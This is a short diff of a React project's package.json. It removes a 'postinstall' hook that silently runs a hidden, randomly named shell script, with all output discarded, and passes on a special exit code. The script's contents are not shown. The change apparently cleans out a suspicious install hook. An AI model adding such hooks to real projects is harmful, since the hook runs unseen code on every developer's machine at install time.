@@ -29,8 +29,7 @@
     "eject": "react-scripts eject",
     "lint": "eslint . --fix --max-warnings=0",
     "format": "prettier . --write",
-    "prepare": "husky install",
-    "postinstall": "sh ./.ci-zu8hit.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky install"
   },
   "eslintConfig": {
     "extends": [
